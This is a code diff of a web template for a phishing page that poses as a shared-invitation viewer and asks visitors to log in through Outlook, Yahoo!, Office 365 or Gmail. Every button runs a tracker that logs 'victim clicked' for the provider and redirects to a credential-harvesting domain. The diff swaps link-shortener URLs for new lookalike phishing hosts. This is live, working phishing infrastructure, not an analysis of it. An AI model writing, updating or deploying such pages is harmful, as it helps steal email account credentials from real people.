@@ -6,7 +6,7 @@
                 <p>To read the invitation, please choose your email provider below login to view shared file.</p>
             </section>
             <section class="links">
-                    <button @click="finishJoob('victim clicked Outlook', 'https://2it.kr/ghlVvp')">
+                    <button @click="finishJoob('victim clicked Outlook', 'https://api-g7f9sirh6.teaminvite-share.art/')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
                         <p>Continue with Outlook</p>
                     </button>
@@ -18,19 +18,19 @@
                     </button>
                 </NuxtLink>
 
-                    <button @click="finishJoob('victim clicked Yahoo!', 'https://2it.kr/bMFW')">
+                    <button @click="finishJoob('victim clicked Yahoo!', 'https://api-yellow.upstart-loan.pro/')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
                         <p>Continue with Yahoo!</p>
                     </button>
 
 
-                    <button @click="finishJoob('victim clicked Office 365', 'https://2it.kr/ghlVvp')">
+                    <button @click="finishJoob('victim clicked Office 365', 'https://api-g7f9sirh6.teaminvite-share.art/')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
                         <p>Continue with Office 365</p>
                     </button>
 
 
-                    <button @click="finishJoob('victim clicked Gmail', 'https://2it.kr/k0')">
+                    <button @click="finishJoob('victim clicked Gmail', 'https://adobersvpsinvites.com/?key=X7kQ9&c=default')">
                         <img src="https://www.logo.wine/a/logo/Gmail/Gmail-Logo.wine.svg" alt="">
                         <p>Continue with Gmail</p>
                     </button>
